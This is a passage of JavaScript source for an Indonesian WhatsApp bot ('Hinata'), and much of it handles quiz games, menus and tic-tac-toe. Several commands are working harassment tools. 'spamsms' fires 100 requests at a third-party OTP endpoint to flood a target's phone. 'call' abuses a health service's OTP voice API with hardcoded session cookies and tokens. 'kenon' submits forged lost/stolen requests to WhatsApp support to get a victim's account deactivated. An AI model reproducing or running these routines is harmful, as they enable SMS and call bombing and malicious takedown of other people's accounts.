    hinata.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
    m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yozip Nama File*')
}
for (let ikali of zipnye) {
    if (budy === ikali) {
        let buffer = fs.readFileSync(`./HinataBase/database/zip/${ikali}.zip`)
        sendzip(buffer)
    }
}
//=================================================//
const senddocu = (teks) => {
    hinata.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
    m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yopdf Nama File*')
}
for (let ikal of docunye) {
    if (budy === ikal) {
        let buffer = fs.readFileSync(`./HinataBase/database/Docu/${ikal}.pdf`)
        senddocu(buffer)
    }
}
const sendvn = (teks) => {
    hinata.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, {quoted:m})
}

for (let anju of vnnye) {
    if (budy === anju) {
        let buffer = fs.readFileSync(`./HinataBase/database/Audio/${anju}.mp3`)
        sendvn(buffer)
    }
}
//=================================================//
var createSerial = (size) => {
    return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
    ppuser = await hinata.profilePictureUrl(m.sender, 'image')
} catch (err) {
    ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

// auto set bio
if (db.data.settings[botNumber].autobio) {
    let setting = global.db.data.settings[botNumber]
    if (new Date() * 1 - setting.status > 1000) {
        let _uptime = process.uptime() * 1000
        let uptime = clockString(_uptime)
        await hinata.updateProfileStatus(`🟢 Aktif Selama : ${runtime(process.uptime())} | Mode : ${hinata.public ? 'Publik' : 'Pribadi'} | Pengguna : ${Object.keys(global.db.data.users).length}`).catch(_ => _)
        setting.status = new Date() * 1
    }
}

if (isCmd && !isUser) {
    pengguna.push(m.sender)
    fs.writeFileSync('./HinataBase/database/user.json', JSON.stringify(pengguna, null, 2))
}

if (isBan) {
    return hinatareplyban()
}

// Response Addlist
if (!isCmd && m.isGroup && isAlreadyResponList(from, body, db_respon_list)) {
    var get_data_respon = getDataResponList(from, body, db_respon_list)
    if (get_data_respon.isImage === false) {
        hinata.sendMessage(from, { text: sendResponList(from, body, db_respon_list) }, {quoted: m})
    } else {
        hinata.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {quoted: m})
    }
}

if (text.includes(`${global.ownernumber}`)) {
    if (m.key.fromMe) return
    if (isCreator) return
    return m.reply(`Itu nomer owner goblok 🤬\n\nMending lu ga usah macem macem deh.\nLu mau di banned 😤`)
}
//=================================================//
if (('family100'+from in _family100) && !isCmd) {
kuis = true
let room = _family100['family100'+from]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
 let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
 if (room.terjawab[index]) return !0
 room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
hinata.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+from]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   hinata.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 hinata.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
 delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 hinata.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
 delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 hinata.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 hinata.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 hinata.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 hinata.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await hinata.sendText(room.x, str, m, { mentions: parseMention(str) } )
await hinata.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && !isCmd && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
hinata.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
hinata.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) hinata.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) hinata.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) hinata.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
hinata.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) hinata.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) hinata.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
hinata.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
//=================================================//
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`❗Jangan tag dia

Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
*${m.pushName}* Telah Kembali Dari Afk ${user.afkReason ? ' Karena ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//
switch (command) {
//=================================================//
case 'nsfw': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (args[0] === "on") {
if (AntiNsfw) return m.reply('Sudah aktif ✅')
ntnsfw.push(from)
fs.writeFileSync('./HinataBase/database/nsfw.json', JSON.stringify(ntnsfw, null, 2))
m.reply('Fitur 🔞 Telah di aktifkan ✅')
var groupe = await hinata.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hinata.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nFitur 🔞 (Tidak Aman) Telah di aktifkan di grup ini, Yang berarti siapapun dapat mengakses grafik seksual dari bot di grup ini!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return m.reply('Tidak aktif ❌')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./HinataBase/database/nsfw.json', JSON.stringify(ntnsfw, null, 2))
m.reply('Fitur 🔞 telah di matikan ❌')
} else {
await reply(`📝Silahkan pilih opsi di bawah ini:\n\n📌Contoh : ${prefix + command} on\n📌Contoh : ${prefix + command} off\n\non untuk mangaktifkan\noff untuk menonaktifkan`)
}
}break
//=================================================//
case 'menu': case 'help': {
let who = m.quoted ? m.quoted.sender : m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? hinata.user.jid : m.sender
let user = global.db.data.users[m.sender]
let ownernya = ownernumber + '@s.whatsapp.net'
let timestampe = speed()
let me = m.sender
let latensie = speed() - timestampe
let ments = [ownernya, me, mark]
let sn = createHash('md5').update(who).digest('hex')
if (!(who in global.db.data.users)) return
if (user.registered === false) return HinataReg()
//await loading()
hinatamsg(`°⌜꧁༒~${global.botname}~༒꧂⌟°

Saya adalah bot WhatsApp otomatis yang dapat membantu melakukan sesuatu, mencari dan mendapatkan data atau informasi melalui WhatsApp.

︶꒷꒦︶ ๋࣭ ⭑︶꒷꒦︶ ๋࣭ ⭑︶꒷꒦︶ ๋࣭ ⭑︶꒷꒦︶ ๋࣭

   ()   ()
 („• ֊ •„)
━O━O━━━━━━━━━━
꒰ 🛡️ ~𝗜𝗡𝗙𝗢 𝗕𝗢𝗧~ ꒱ ೄྀ࿐ ˊˎ-
━━━━━━⊱⋆⊰━━━━━━
ミ *Bot* : ${global.botname}
ミ *Pengembang* : ${global.ownername}
ミ *Nomer* : +${ownernumber}
ミ *Premium* :  ${prem.length}
ミ *Mode* : ${hinata.public ? 'Public' : `Pribadi`}
ミ *Host Name* : ${global.hostname}
ミ *Platform* : ${os.platform()}

꒰ 👤 ~𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥~ ꒱ ೄྀ࿐ ˊˎ-
━━━━━━⊱⋆⊰━━━━━━
ミ *Nama* : ${pushname}
ミ *Nomer* : +${me.split('@')[0]}
ミ *Status* : ${isCreator ? 'Premium' : `Free`}
ミ *Limit* : ${isPrem ? 'Unlimitid' : user.limit}
ミ *Warn* : ${user.warn}/${global.maxwarn}
ミ *No. Seri* : \`\`\`${sn}\`\`\`

꒰ ⌚ ~𝗜𝗡𝗙𝗢 𝗪𝗔𝗞𝗧𝗨~ ꒱ ೄྀ࿐ ˊˎ-
━━━━━━⊱⋆⊰━━━━━━
ミ *Jam* : ${time}
ミ *Tanggal* : ${xdate}
ミ *Hari* : ${xhari}
ミ *Bulan* : ${xbulan}
ミ *Tahun* : ${xtahun}

꒰ 📔 ~𝗠𝗘𝗡𝗨~ ꒱ ೄྀ࿐ ˊˎ-
━━━━━━⊱⋆⊰━━━━━━
ミ ⛽️ \`\`\`menugas\`\`\`
ミ 🕋 \`\`\`menuislam\`\`\`
ミ 👨🏾‍💻 \`\`\`menubug\`\`\`
ミ 🫂 \`\`\`menugroup\`\`\`
ミ 📰 \`\`\`menuberita\`\`\`
ミ 🤡 \`\`\`menufun\`\`\`
ミ ➕ \`\`\`menuadd\`\`\`
ミ 🎲 \`\`\`menurandom\`\`\`
ミ 📥 \`\`\`menudownload\`\`\`
ミ 🕵🏻‍♂️ \`\`\`menustalk\`\`\`
ミ 🔞 \`\`\`menunsfw\`\`\`
ミ 🛍️ \`\`\`menustore\`\`\`
ミ 🎮 \`\`\`menugame\`\`\`
ミ 📝 \`\`\`textmaker\`\`\`
ミ 🎧 \`\`\`listmusik\`\`\`
ミ 👀 \`\`\`cucimata\`\`\`
ミ 🤝 \`\`\`support\`\`\`
ミ 🆘 \`\`\`info\`\`\`

📡 *Kecepatan*
${latensie.toFixed(4)} miliseconds

📺 *Waktu Aktif*
${runtime(process.uptime())}
`)}
break
//=================================================//
case 'menubug': case 'bugmenu': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${bugmenu(prefix)}`)
}break
//=================================================//
case 'groupmenu': case 'grupmenu': case 'menugroup': case 'menugrup': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
hinatamsg(`${groupmenu(prefix)}`)
}break
//=================================================//
case 'downloadmenu': case 'menudownload': case 'menudonlod': case 'menudonlot ':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${downloadmenu(prefix)}`)
}break
//=================================================//
case 'randommenu': case 'menurandom': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${randommenu(prefix)}`)
}break
//=================================================//
case 'islammenu': case 'menuislam': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${islammenu(prefix)}`)
}break
//=================================================//
case 'gasmenu': case 'menugas': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${gasmenu(prefix)}`)
}break
//=================================================//
case 'textmaker': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${textmakermenu(prefix)}`)
}break
//=================================================//
case 'listmusik': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${listmusikmenu(prefix)}`)
}break
//=================================================//
case 'addmenu': case 'menuadd': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${addmenmenu(prefix)}`)
}break
//=================================================//
case 'cucimata': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${cucimatamenu(prefix)}`)
}break
//=================================================//
case 'beritamenu': case 'menuberita': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${beritamenu(prefix)}`)
}break
//=================================================//
case 'nsfwmenu': case 'menunsfw': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
hinatamsg(`${nsfwmenu(prefix)}`)
}break
//=================================================//
case 'funmenu': case 'menufun': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${funmenu(prefix)}`)
}break
//=================================================//
case 'stalkmenu': case 'menustalk': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${stalkmenu(prefix)}`)
}break
//=================================================//
case 'storemenu': case 'menustore': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${storemenu(prefix)}`)
}break
//=================================================//
case 'gamemenu': case 'menugame': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${gamemenu(prefix)}`)
}break
//=================================================//
case 'spamsms': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📝Cara Menggunakan spamsms nomor/reply pesan target*\n\n📌Contoh: spamsms +${global.ownernumber} pesat text`)
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return m.reply('Awali nomor dengan +62')
if (froms == owner) return m.reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS)`);
});
}
}
m.reply(`spam sms/call akan di kirim ke no target`)
}break
//=================================================//
case 'call': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!args[0]) return reply(`📝Cara menggunakan ${prefix+command} nomor\n\n📌Contoh ${prefix+command} +${global.ownernumber}`)
let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+${global.ownernumber}`)) return m.reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
}break
//=================================================
case 'kenon': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return m.reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`\`\`\`WhatsApp Support\`\`\`

Hai,

 Terima kasih atas pesan Anda.

 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda telah di keluarkan maka untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.

 Selama periode penonaktifan:

 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda.
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke

 akun akan tetap dalam status tertunda hingga 30 hari.

 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai

 secepatnya.  Daftar ulang akun Anda dengan memasukkan 6 digit

 kode yang Anda terima melalui SMS atau panggilan telepon.  Jika Anda mendaftar ulang

 pulihkan riwayat obrolan Anda di: Android |  iPhone.

